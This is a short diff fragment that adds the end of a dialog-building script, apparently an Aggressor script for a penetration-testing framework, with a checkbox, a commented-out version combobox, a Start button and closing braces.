+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+}
+}}
+
+
+
